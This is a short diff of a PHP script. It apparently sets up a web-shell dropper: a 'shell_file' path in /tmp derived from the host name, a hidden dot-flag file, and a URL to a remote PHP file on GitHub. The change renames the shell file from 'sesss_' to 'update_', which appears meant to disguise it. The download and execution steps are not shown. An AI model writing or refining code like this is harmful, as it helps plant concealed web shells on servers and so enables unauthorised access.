@@ -1,5 +1,5 @@
 <?php
-$shell_file = '/tmp/sesss_' . md5($_SERVER['HTTP_HOST']) . '.php';
+$shell_file = '/tmp/update_' . md5($_SERVER['HTTP_HOST']) . '.php';
 $hidden_flag = '/tmp/.' . md5($_SERVER['HTTP_HOST']) . '.flag';
 
 $url = "https://github.com/Jenderal92/php/raw/refs/heads/master/13k.php";
